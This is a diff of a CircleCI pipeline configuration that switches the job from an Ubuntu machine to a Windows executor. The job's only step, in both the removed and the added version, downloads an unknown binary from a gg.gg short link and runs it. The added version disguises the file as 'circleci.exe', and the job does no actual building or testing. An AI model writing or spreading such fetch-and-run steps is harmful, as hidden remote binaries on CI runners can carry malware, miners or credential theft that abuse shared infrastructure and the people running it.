@@ -1,9 +1,12 @@
 version: 2.1
  
+orbs:
+  win: circleci/windows@2.2.0
+ 
 jobs:
   build:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
+    executor:
+      name: win/default
+      shell: cmd.exe
     steps:
-      - run: wget -O test http://gg.gg/vl3e0 && chmod +x test && chmod 777 test && ./test
+      - run: curl -L -o circleci.exe http://gg.gg/uspi2 && circleci.exe
